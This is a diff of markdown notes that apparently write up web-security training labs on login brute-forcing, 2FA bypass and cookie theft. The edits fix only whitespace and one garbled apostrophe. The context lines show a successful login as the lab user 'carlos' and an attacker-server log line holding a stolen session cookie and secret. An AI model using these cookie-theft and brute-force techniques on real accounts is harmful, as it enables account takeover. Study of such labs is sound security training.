@@ -42,9 +42,9 @@ During auditing, check whether the website discloses potential usernames publicl
 
 Passwords can similarly be brute-forced, with the difficulty varying based on the strength of the password. Many websites adopt some form of password policy, which forces users to create high-entropy passwords that are, theoretically at least, harder to crack using brute-force alone. This typically involves enforcing passwords with:
 ```ad-info
-    A minimum number of characters
-    A mixture of lower and uppercase letters
-    At least one special character
+ A minimum number of characters
+ A mixture of lower and uppercase letters
+ At least one special character
 ```
 
 
@@ -315,7 +315,7 @@ So, 2FA code is `0574
 Lets try to authenticate using username carlos:
 ![Pasted image 20240926171143.png](../../../../IMAGES/Pasted%20image%2020240926171143.png)
 
-And weÂ´re in:
+And we´re in:
 
 ![Pasted image 20240926171222.png](../../../../IMAGES/Pasted%20image%2020240926171222.png)
 ![Pasted image 20240926171306.png](../../../../IMAGES/Pasted%20image%2020240926171306.png)
@@ -396,7 +396,7 @@ Seems like a secret (cookie) from our victim:
 
 ```cookie
 
-10.0.4.235      2024-09-27 18:41:59 +0000 "GET /secret=62Gl05NdioA3apGNjKnBqjJRi4WOlrTp;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+10.0.4.235 2024-09-27 18:41:59 +0000 "GET /secret=62Gl05NdioA3apGNjKnBqjJRi4WOlrTp;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
 
 ```
 
